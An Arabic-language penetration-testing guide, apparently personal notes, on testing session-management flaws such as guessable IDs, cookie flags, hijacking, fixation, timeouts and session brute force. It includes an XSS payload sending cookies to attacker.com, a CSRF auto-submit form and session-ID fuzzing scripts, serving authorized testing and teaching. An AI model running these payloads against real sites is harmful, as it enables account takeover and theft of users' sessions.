
**طريقة الاختبار**: هنختبر إدارة الجلسات بشكل منهجي عشان نكتشف إذا كان فيه عيوب في توليد معرفات الجلسة، إعدادات الكوكيز، صلاحية الجلسة، أو حمايتها من الهجمات. تحت هلاقي **كل المحاولات الممكنة** مقسمة حسب الطريقة.

---

#### **المحاولة الأولى: اختبار قابلية تخمين معرف الجلسة (Predictable Session ID)**
**الهدف**: نشوف إذا كان معرف الجلسة (Session ID) قصير، متكرر، أو بيتبع نمط يسهل تخمينه.
- **الخطوات**:
  1. سجل دخول للموقع بحساب تحت سيطرتك (مثل `https://target.com/login`).
  2. استخدم DevTools (تبويب Application > Cookies) أو Burp Suite عشان تستخرج الـ Session ID من الكوكيز (مثل `session=abc123`).
  3. حلل الـ Session ID:
     - الطول: لو قصير (مثل 4-8 أحرف)، يبقى قابل للتخمين.
     - النمط: لو أرقام بس (مثل `123456`) أو بيستخدم Base64 لمعلومات متوقعة (زي اسم المستخدم)، يبقى ضعيف.
  4. سجل دخول كذا مرة (أو افتح جلسات في متصفحات مختلفة) واجمع عدة Session IDs.
  5. قارن الـ Session IDs:
     - لو متشابهة أو بتتغير بشكل متوقع (مثل زيادة بـ 1)، يبقى فيه ثغرة.
     - لو بتتكرر، يبقى فيه مشكلة في التوليد.
  6. استخدم Burp Suite Sequencer عشان تحلل عشوائية الـ Session IDs (Randomness/Entropy).
  7. لو الـ Session ID قصير، جرب تخمينه يدويًا أو بـ Burp Suite Intruder (مثل تجربة `session=123456`، `session=123457`).
- **البيانات اللي هنجربها**:
  - حسابات: حساب تحت سيطرتك (مثل `test@example.com`).
  - Session IDs: `abc123`، `123456`، أو أي نمط متوقع.
- **النتيجة المتوقعة**:
  - نجاح: Session ID قصير (مثل `123456`) أو متوقع، يعني قابل للتخمين.
  - فشل: Session ID طويل (مثل 32 حرف عشوائي) وعشوائي تمامًا (مثل UUID)، يعني محمي.
- **الأدوات**:
  - **DevTools**: تفقد الكوكيز في تبويب Application.
  - **Burp Suite Sequencer**: تحليل عشوائية الـ Session IDs.
  - **cURL**:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
    - جرب Session IDs مختلفة يدويًا.
  - **Python Script** (لجمع Session IDs):
    ```python
    import requests

    url = "https://target.com/login"
    credentials = {"username": "test@example.com", "password": "password"}

    for _ in range(5):
        response = requests.post(url, data=credentials)
        session_id = response.cookies.get("session")
        print(f"Session ID: {session_id}")
    ```
- **الأوامر**:
  - cURL:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
  - Python: `python collect_session_ids.py` (احفظ السكربت فوق).
  - Burp Suite Sequencer:
    - اجمع Session IDs من طلبات تسجيل الدخول.
    - حلل Entropy باستخدام Sequencer.

---

#### **المحاولة التانية: اختبار إعدادات الكوكيز (Cookie Security Attributes)**
**الهدف**: نشوف إذا كان الكوكيز اللي بتحتوي على الـ Session ID محمية بإعدادات `Secure`، `HttpOnly`، و`SameSite`.
- **الخطوات**:
  1. سجل دخول للموقع واستخرج الكوكيز باستخدام DevTools أو Burp Suite.
  2. افحص إعدادات الكوكيز:
     - ء **Secure**: لو مش موجود، الكوكي ممكن يتبعت عبر HTTP (غير مشفر) ويتسرق عبر MITM.
     - ء **HttpOnly**: لو مش موجود، الكوكي ممكن يتسرق عبر XSS (JavaScript).
     - ء **SameSite**: لو مش `Strict` أو `Lax`， الكوكي ممكن يتسرق عبر CSRF.
  3. لو أي إعداد من دول غايب، جرب استغلاله:
     - لو `Secure` غايب، أرسل طلب عبر HTTP (بدل HTTPS) باستخدام Burp Suite.
     - لو `HttpOnly` غايب، جرب سكربت XSS (مثل `document.cookie`) عشان تسرق الكوكي.
     - لو `SameSite` غايب، جرب هجوم CSRF عشان ترغم المستخدم على طلب باستخدام الكوكي.
  4. سجل النتايج (مثل إذا الكوكي اتسرق أو اشتغل في سياق غلط).
- **البيانات اللي هنجربها**:
  - كوكيز: `session=abc123`
  - طلبات: طلبات HTTP/HTTPS، سكربتات XSS، نماذج CSRF.
- **النتيجة المتوقعة**:
  - نجاح: الكوكي بدون `Secure`، `HttpOnly`، أو `SameSite`، يعني معرض للسرقة.
  - فشل: الكوكي محمي بكل الإعدادات (`Secure`, `HttpOnly`, `SameSite=Strict`).
- **الأدوات**:
  - **DevTools**: تفقد إعدادات الكوكيز في تبويب Application.
  - **Burp Suite**: اعترض الطلبات وافحص الـ Set-Cookie Header.
  - **cURL**:
    ```bash
    curl -I https://target.com/login
    ```
    - شوف الـ Set-Cookie Header في الرد.
  - **XSS Test Script** (لو `HttpOnly` غايب):
    ```javascript
    alert(document.cookie);
    ```
  - **CSRF PoC** (لو `SameSite` غايب):
    ```html
    <form action="https://target.com/update-profile" method="POST">
        <input type="hidden" name="email" value="attacker@example.com">
        <input type="submit" value="Submit">
    </form>
    <script>document.forms[0].submit();</script>
    ```
- **الأوامر**:
  - cURL:
    ```bash
    curl -I https://target.com/login
    ```
  - Burp Suite:
    - اعترض طلب تسجيل الدخول.
    - افحص الـ Set-Cookie Header لإعدادات `Secure`، `HttpOnly`، و`SameSite`.

---

#### **المحاولة التالتة: اختبار سرقة الجلسة (Session Hijacking)**
**الهدف**: نشوف إذا كان المهاجم يقدر يستخدم Session ID مسروق عشان يدخل على حساب مستخدم تاني.
- **الخطوات**:
  1. سجل دخول بحساب تحت سيطرتك واستخرج الـ Session ID (مثل `session=abc123`).
  2. جرب استخدام الـ Session ID في متصفح تاني أو جهاز مختلف:
     - أضف الكوكي يدويًا في DevTools أو باستخدام cURL.
     - أرسل طلب لصفحة محمية (مثل `https://target.com/profile`).
  3. لو الطلب نجح ودخلت على الحساب، يبقى الـ Session ID مش مربوط بمعلومات إضافية (زي IP أو User-Agent).
  4. جرب هجمات عملية لسرقة الـ Session ID:
     -  ء  **MITM**: لو الكوكي بدون `Secure`، اعترض الطلبات عبر شبكة غير مشفرة.
     -  ء  **XSS**: لو الكوكي بدون `HttpOnly`، استخدم سكربت زي:
       ```javascript
       new Image().src = "https://attacker.com/steal?cookie=" + document.cookie;
       ```
     -  ء  **Social Engineering**: خدّع المستخدم عشان يشارك الـ Session ID (نادر بس ممكن).
  5. تحقق إذا الموقع بيفرض قيود على الجلسة (مثل ربط الـ Session ID بـ IP أو جهاز).
- **البيانات اللي هنجربها**:
  - Session ID: `abc123`
  - صفحات محمية: `https://target.com/profile`
- **النتيجة المتوقعة**:
  - نجاح: الـ Session ID المسروق بيسمح بالدخول من جهاز تاني، يعني الجلسة معرضة للسرقة.
  - فشل: الـ Session ID بيطلع خطأ لو استخدم في سياق مختلف، يعني الجلسة محمية.
- **الأدوات**:
  - **DevTools**: أضف الكوكي يدويًا في تبويب Application.
  - **cURL**:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
  - **Burp Suite**: أرسل طلبات بـ Session IDs مختلفة.
  - **XSS PoC**:
    ```javascript
    new Image().src = "https://attacker.com/steal?cookie=" + document.cookie;
    ```
- **الأوامر**:
  - cURL:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
  - Burp Suite:
    - اعترض طلب لصفحة محمية.
    - عدّل الـ Cookie بـ Session ID مسروق وأرسل الطلب.

### صوره ملخصه فكره ال Session Hijacking
![[Pasted image 20250427080525.png|738]]


---

#### **المحاولة الرابعة: اختبار تثبيت الجلسة (Session Fixation)**
**الهدف**: نشوف إذا كان الموقع بيسمح للمهاجم بفرض Session ID على المستخدم (Session Fixation).
- **الخطوات**:
  1. زور رابط للموقع يحتوي على Session ID محدد (مثل `https://target.com?session=attacker123`).
  2. أرسل الرابط لمستخدم (مثل عبر إيميل أو Social Engineering).
  3. لو المستخدم سجل دخول من الرابط، تحقق إذا كان الموقع استخدم نفس الـ Session ID (`attacker123`) بدل ما يولد واحد جديد.
  4. جرب استخدام الـ Session ID (`attacker123`) في متصفحك عشان تدخل على حساب المستخدم.
  5. لو نجحت في الدخول، يبقى الموقع معرض لـ Session Fixation.
  6. تحقق إذا الموقع بيجدد الـ Session ID بعد تسجيل الدخول (المفروض يعمل كده).
- **البيانات اللي هنجربها**:
  - رابط مزور: `https://target.com?session=attacker123`
  - Session ID: `attacker123`
- **النتيجة المتوقعة**:
  - نجاح: الـ Session ID المفروض اشتغل بعد تسجيل الدخول، يعني فيه ثغرة Session Fixation.
  - فشل: الموقع بيولد Session ID جديد بعد تسجيل الدخول، يعني محمي.
- **الأدوات**:
  - **متصفح**: افتح الرابط المزور وسجل دخول.
  - **Burp Suite**: اعترض الطلبات وشوف إذا الـ Session ID اتغير.
  - **cURL**:
    ```bash
    curl -b "session=attacker123" https://target.com/login
    ```
- **الأوامر**:
  - cURL:
    ```bash
    curl -b "session=attacker123" https://target.com/login
    ```
  - Burp Suite:
    - اعترض طلب تسجيل الدخول.
    - تحقق من الـ Set-Cookie Header بعد الدخول.

### صوره ملخصه فكره ال Session Fixation
![[Pasted image 20250427080711.png]]
#### توضيح الصوره :
الفكره ان الهاكر بيزرع  session id  في ال server علشان الضحيه لما تخش علي server ده تاخد ال session id  ده ساعتها الهاكر يقدر يخش علي email الضحيه (لانه عرف ال user وال password )

---


#### **المحاولة الخامسة: اختبار صلاحية الجلسة (Session Timeout)**
**الهدف**: نشوف إذا كان الموقع بيبطل الجلسة بعد فترة معقولة من عدم النشاط (Session Timeout).
- **الخطوات**:
  1. سجل دخول للموقع بحساب تحت سيطرتك.
  2. استخراج الـ Session ID من الكوكيز (مثل `session=abc123`).
  3. اترك الجلسة بدون نشاط لفترات مختلفة (مثل 10 دقايق، 30 دقيقة، ساعة).
  4. جرب استخدام الـ Session ID بعد كل فترة:
     - أرسل طلب لصفحة محمية (مثل `https://target.com/profile`) باستخدام cURL أو المتصفح.
  5. لو الجلسة لسه صالحة بعد فترة طويلة (مثل ساعات أو أيام)، يبقى فيه ثغرة.
  6. تحقق إذا الموقع بيفرض إعادة تسجيل دخول بعد عدم النشاط.
- **البيانات اللي هنجربها**:
  - Session ID: `abc123`
  - فترات: 10 دقايق، 30 دقيقة، ساعة.
- **النتيجة المتوقعة**:
  - نجاح: الجلسة لسه صالحة بعد فترة طويلة (مثل ساعة)، يعني معرضة للاستغلال.
  - فشل: الجلسة بتبطل بعد فترة قصيرة (مثل 15 دقيقة)، يعني محمية.
- **الأدوات**:
  - **متصفح**: جرب الجلسة بعد فترات.
  - **cURL**:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
  - **Burp Suite Repeater**: أرسل الطلبات بعد فترات.
- **الأوامر**:
  - cURL:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
  - Burp Suite Repeater:
    - احفظ طلب الصفحة المحمية.
    - كرر الطلب بعد فترات زمنية.

---

#### **المحاولة السادسة: اختبار إعادة استخدام الجلسة بعد تسجيل الخروج**
**الهدف**: نشوف إذا كان الـ Session ID بيظل صالح بعد ما المستخدم يسجل خروج (Logout).
- **الخطوات**:
  1. سجل دخول للموقع واستخرج الـ Session ID (مثل `session=abc123`).
  2. سجل خروج من الحساب (مثل `https://target.com/logout`).
  3. جرب استخدام الـ Session ID القديم:
     - أرسل طلب لصفحة محمية (مثل `https://target.com/profile`) باستخدام cURL أو المتصفح.
  4. لو الجلسة لسه صالحة بعد تسجيل الخروج، يبقى فيه ثغرة.
  5. تحقق إذا الموقع بيبطل الـ Session ID على السيرفر بعد الخروج.
- **البيانات اللي هنجربها**:
  - Session ID: `abc123`
  - صفحة محمية: `https://target.com/profile`
- **النتيجة المتوقعة**:
  - نجاح: الـ Session ID لسه صالح بعد الخروج، يعني معرض للاستغلال.
  - فشل: الـ Session ID بيطلع خطأ بعد الخروج، يعني الجلسة بتبطل.
- **الأدوات**:
  - **متصفح**: جرب الجلسة بعد الخروج.
  - **cURL**:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
  - **Burp Suite**: اعترض طلبات الخروج وتحقق من الردود.
- **الإوامر**:
  - cURL:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
  - Burp Suite:
    - اعترض طلب الخروج.
    - أرسل طلب بـ Session ID القديم لصفحة محمية.



---

#### **المحاولة السابعة: اختبار الجلسات المتعددة (Concurrent Sessions)**
**الهدف**: نشوف إذا كان الموقع بيسمح باستخدام نفس الـ Session ID في أكتر من جهاز أو متصفح في نفس الوقت.
- **الخطوات**:
  1. سجل دخول بحساب تحت سيطرتك واستخرج الـ Session ID.
  2. استخدم الـ Session ID في متصفح أو جهاز تاني (مثل إضافة الكوكي يدويًا).
  3. جرب الوصول لصفحة محمية (مثل `https://target.com/profile`) من الجهازين.
  4. لو الجلسة اشتغلت في الجهازين مع نفس الـ Session ID، يبقى فيه ثغرة.
  5. تحقق إذا الموقع بيفرض قيود على الجلسات المتعددة (مثل إبطال الجلسة القديمة).
- **البيانات اللي هنجربها**:
  - Session ID: `abc123`
  - صفحة محمية: `https://target.com/profile`
- **النتيجة المتوقعة**:
  - نجاح: الـ Session ID بيشتغل في أكتر من جهاز، يعني معرض للاستغلال.
  - فشل: الجلسة بتبطل أو بتطلب إعادة تسجيل في جهاز تاني.
- **الأدوات**:
  - **متصفحين مختلفين**: جرب الجلسة في Chrome وFirefox.
  - **cURL**:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
  - **Burp Suite**: أرسل طلبات من جلسات مختلفة.
- **الأوامر**:
  - cURL:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
  - Burp Suite:
    - أرسل طلبات بـ Session ID واحد من سياقات مختلفة.

---

#### **المحاولة الثامنة: أتمتة اختبار الجلسات باستخدام أدوات**
**الهدف**: أتمتة اختبار توليد الـ Session IDs أو استغلالها عشان نختبر عدد كبير من الحالات بسرعة.
- **الخطوات**:
  1. جهز قائمة بـ Session IDs محتملة (مثل أرقام أو أنماط متوقعة) لو الـ Session ID ضعيف.
  2. استخدم Burp Suite Intruder أو wfuzz عشان ترسل طلبات بـ Session IDs مختلفة.
  3. حلل الردود بناءً على:
     - كود الـ HTTP Status (مثل 200 OK لجلسة صالحة).
     - طول الـ Response (Response Length).
     - نص الرد (مثل "Welcome" لجلسة صالحة).
  4. لو لقيت Session ID صالح، سجله لتحليل إضافي.
  5. استخدم سكربت Python لجمع وتحليل Session IDs تلقائيًا.
- **البيانات اللي هنجربها**:
  - ملف `session_ids.txt`:
    ```
    123456
    123457
    abc123
    ```
  - صفحة محمية: `https://target.com/profile`
- **النتيجة المتوقعة**:
  - نجاح: اكتشاف Session ID صالح، يعني الجلسات ضعيفة.
  - فشل: كل الردود بتطلع خطأ، يعني الجلسات محمية.
- **الأدوات**:
  - **Burp Suite Intruder**:
    - اعترض طلب لصفحة محمية.
    - حدد حقل `session` في الكوكي كـ Payload Position.
    - استخدم قائمة `session_ids.txt`.
  - **wfuzz**:
    ```bash
    wfuzz -c -z file,session_ids.txt --hc 404 -b "session=FUZZ" https://target.com/profile
    ```
  - **Python Script**:
    ```python
    import requests

    url = "https://target.com/profile"
    session_ids = ["123456", "123457", "abc123"]

    for sid in session_ids:
        response = requests.get(url, cookies={"session": sid})
        print(f"Session ID: {sid}, Status: {response.status_code}, Length: {len(response.text)}")
    ```
- **الأوامر**:
  - wfuzz:
    ```bash
    wfuzz -c -z file,session_ids.txt --hc 404 -b "session=FUZZ" https://target.com/profile
    ```
  - Python: `python test_session_ids.py` (احفظ السكربت فوق).

---

### **ملخص شامل لكل المحاولات والأوامر**

هنا قائمة بكل المحاولات مع الأوامر والأدوات الخاصة بيها لاختبار Session Management Flaws:

1. **قابلية تخمين معرف الجلسة**:
   - **البيانات**: Session IDs (`abc123`).
   - **الأدوات**: DevTools، Burp Suite Sequencer، cURL، Python.
   - **الأوامر**:
     ```bash
     curl -b "session=abc123" https://target.com/profile
     ```
     ```python
     import requests
     url = "https://target.com/login"
     credentials = {"username": "test@example.com", "password": "password"}
     for _ in range(5):
         response = requests.post(url, data=credentials)
         print(f"Session ID: {response.cookies.get('session')}")
     ```

2. **إعدادات الكوكيز**:
   - **البيانات**: كوكيز (`session=abc123`).
   - **الأدوات**: DevTools، Burp Suite، cURL.
   - **الأوامر**:
     ```bash
     curl -I https://target.com/login
     ```

3. **سرقة الجلسة**:
   - **البيانات**: Session ID (`abc123`).
   - **الأدوات**: DevTools، cURL، Burp Suite.
   - **الأوامر**:
     ```bash
     curl -b "session=abc123" https://target.com/profile
     ```

4. **تثبيت الجلسة**:
   - **البيانات**: رابط مزور (`https://target.com?session=attacker123`).
   - **الأدوات**: متصفح، Burp Suite، cURL.
   - **الأوامر**:
     ```bash
     curl -b "session=attacker123" https://target.com/login
     ```

5. **صلاحية الجلسة**:
   - **البيانات**: Session ID (`abc123`).
   - **الأدوات**: متصفح، cURL، Burp Suite.
   - **الأوامر**:
     ```bash
     curl -b "session=abc123" https://target.com/profile
     ```

6. **إعادة استخدام الجلسة بعد الخروج**:
   - **البيانات**: Session ID (`abc123`).
   - **الأدوات**: متصفح، cURL، Burp Suite.
   - **الأوامر**:
     ```bash
     curl -b "session=abc123" https://target.com/profile
     ```

7. **الجلسات المتعددة**:
   - **البيانات**: Session ID (`abc123`).
   - **الأدوات**: متصفحين، cURL، Burp Suite.
   - **الأوامر**:
     ```bash
     curl -b "session=abc123" https://target.com/profile
     ```

8. **أتمتة اختبار الجلسات**:
   - **البيانات**: ملف `session_ids.txt`.
   - **الأدوات**: Burp Suite Intruder، wfuzz، Python.
   - **الأوامر**:
     ```bash
     wfuzz -c -z file,session_ids.txt --hc 404 -b "session=FUZZ" https://target.com/profile
     ```
     ```python
     import requests
     url = "https://target.com/profile"
     session_ids = ["123456", "123457"]
     for sid in session_ids:
         response = requests.get(url, cookies={"session": sid})
         print(f"Session ID: {sid}, Status: {response.status_code}")
     ```

---

### **نصايح للاختبار**
- **الأخلاقيات**: لازم تكون عندك إذن صريح قبل ما تختبر أي موقع. الاختبار بدون إذن غير قانوني.
- **التجهيز**: استخدم حسابات تحت سيطرتك وجهز قوائم Session IDs محتملة لو الجلسات ضعيفة.
- **إعداد Burp Suite**: شغل Proxy واستخدم Intruder/Sequencer/Repeater لتحليل الجلسات.
- **التوثيق**: سجل كل الـ Session IDs، الردود، والنتايج لتقريرك.
- **فحص الحلول**: لو لقيت ثغرة، تأكد إذا الموقع بيفرض:
  - Session IDs طويلة وعشوائية (مثل UUID).
  - إعدادات كوكيز (`Secure`, `HttpOnly`, `SameSite=Strict`).
  - إبطال الجلسة بعد الخروج أو عدم النشاط.
  - قيود على الجلسات المتعددة.

---

### **مثال لنتيجة السيناريو**
- **Session ID ضعيف**: `session=123456` تم تخمينه بسهولة.
- **كوكي غير محمي**: الكوكي بدون `HttpOnly` اتسرق عبر XSS.
- **Session Fixation**: رابط مزور (`?session=attacker123`) سمح بالدخول.
- **جلسة طويلة**: الجلسة لسه صالحة بعد ساعة من عدم النشاط.

لو محتاج مساعدة في إعداد الأدوات (زي Burp Suite أو wfuzz) أو عايز سكربتات إضافية لأتمتة الاختبار، قولي!



# استغلال عيوب إدارة الجلسات (Session Management Flaws)

دليل خطوة بخطوة لاختبار ثغرات إدارة الجلسات في موقع إلكتروني. كل محاولة تتضمن وصفًا وتعليمات الاختبار وملخص الأوامر/الأدوات.

---

## المحاولة الأولى: قابلية تخمين معرف الجلسة
**الوصف**: اختبار إذا كان معرف الجلسة (Session ID) قصيرًا أو متوقعًا بحيث يمكن تخمينه.
- **الخطوات**:
  1. سجل دخول إلى `https://target.com/login`.
  2. استخرج الـ Session ID من الكوكيز.
  3. حلل طول ونمط الـ Session ID.
  4. اجمع عدة Session IDs وقارنها.
- **الأدوات/الأوامر**:
  - DevTools: افحص الكوكيز.
  - cURL:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
  - Python:
    ```python
    import requests
    url = "https://target.com/login"
    credentials = {"username": "test@example.com", "password": "password"}
    for _ in range(5):
        response = requests.post(url, data=credentials)
        print(f"Session ID: {response.cookies.get('session')}")
    ```
  - Burp Suite Sequencer: تحليل عشوائية الـ Session IDs.
- **الملخص**:
  - cURL: `curl -b "session=abc123" https://target.com/profile`
  - Python: `python collect_session_ids.py`

---

## المحاولة الثانية: إعدادات الكوكيز
**الوصف**: اختبار إذا كان الكوكيز محمية بـ `Secure`، `HttpOnly`، و`SameSite`.
- **الخطوات**:
  1. استخرج الكوكيز بعد تسجيل الدخول.
  2. افحص إعدادات `Secure`، `HttpOnly`، و`SameSite`.
  3. جرب استغلال أي إعداد مفقود (مثل XSS أو CSRF).
- **الأدوات/الأوامر**:
  - DevTools: افحص الكوكيز.
  - cURL:
    ```bash
    curl -I https://target.com/login
    ```
  - XSS PoC:
    ```javascript
    alert(document.cookie);
    ```
  - CSRF PoC:
    ```html
    <form action="https://target.com/update-profile" method="POST">
        <input type="hidden" name="email" value="attacker@example.com">
        <input type="submit" value="Submit">
    </form>
    <script>document.forms[0].submit();</script>
    ```
- **الملخص**:
  - cURL: `curl -I https://target.com/login`

---

## المحاولة الثالثة: سرقة الجلسة
**الوصف**: اختبار إذا كان الـ Session ID المسروق يسمح بالدخول من جهاز آخر.
- **الخطوات**:
  1. استخرج الـ Session ID.
  2. جرب الـ Session ID في متصفح/جهاز آخر.
  3. جرب هجمات مثل XSS أو MITM.
- **الأدوات/الأوامر**:
  - cURL:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
  - XSS PoC:
    ```javascript
    new Image().src = "https://attacker.com/steal?cookie=" + document.cookie;
    ```
- **الملخص**:
  - cURL: `curl -b "session=abc123" https://target.com/profile`

---

## المحاولة الرابعة: تثبيت الجلسة
**الوصف**: اختبار إذا كان الموقع يسمح بفرض Session ID على المستخدم.
- **الخطوات**:
  1. زور رابط بـ Session ID (مثل `https://target.com?session=attacker123`).
  2. تحقق إذا كان الموقع يستخدم نفس الـ Session ID بعد تسجيل الدخول.
- **الأدوات/الأوامر**:
  - cURL:
    ```bash
    curl -b "session=attacker123" https://target.com/login
    ```
- **الملخص**:
  - cURL: `curl -b "session=attacker123" https://target.com/login`

---

## المحاولة الخامسة: صلاحية الجلسة
**الوصف**: اختبار إذا كان الموقع يبطل الجلسة بعد فترة عدم نشاط.
- **الخطوات**:
  1. سجل دخول واستخرج الـ Session ID.
  2. جرب الجلسة بعد فترات (10 دقايق، ساعة).
- **الأدوات/الأوامر**:
  - cURL:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
- **الملخص**:
  - cURL: `curl -b "session=abc123" https://target.com/profile`

---

## المحاولة السادسة: إعادة استخدام الجلسة بعد الخروج
**الوصف**: اختبار إذا كان الـ Session ID يظل صالحًا بعد تسجيل الخروج.
- **الخطوات**:
  1. سجل دخول واستخرج الـ Session ID.
  2. سجل خروج وجرب الـ Session ID.
- **الأدوات/الأوامر**:
  - cURL:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
- **الملخص**:
  - cURL: `curl -b "session=abc123" https://target.com/profile`

---

## المحاولة السابعة: الجلسات المتعددة
**الوصف**: اختبار إذا كان الموقع يسمح بجلسات متعددة بنفس الـ Session ID.
- **الخطوات**:
  1. استخدم الـ Session ID في جهازين.
  2. تحقق إذا كان الوصول ممكن من الجهازين.
- **الأدوات/الأوامر**:
  - cURL:
    ```bash
    curl -b "session=abc123" https://target.com/profile
    ```
- **الملخص**:
  - cURL: `curl -b "session=abc123" https://target.com/profile`

---

## المحاولة الثامنة: أتمتة اختبار الجلسات
**الوصف**: أتمتة اختبار الـ Session IDs لتجربة عدة معرفات.
- **الخطوات**:
  1. جهز قائمة Session IDs.
  2. استخدم أداة لإرسال طلبات متعددة.
- **الأدوات/الأوامر**:
  - wfuzz:
    ```bash
    wfuzz -c -z file,session_ids.txt --hc 404 -b "session=FUZZ" https://target.com/profile
    ```
  - Python:
    ```python
    import requests
    url = "https://target.com/profile"
    session_ids = ["123456", "123457"]
    for sid in session_ids:
        response = requests.get(url, cookies={"session": sid})
        print(f"Session ID: {sid}, Status: {response.status_code}")
    ```
- **الملخص**:
  - wfuzz: `wfuzz -c -z file,session_ids.txt --hc 404 -b "session=FUZZ" https://target.com/profile`
  - Python: `python test_session_ids.py`

---

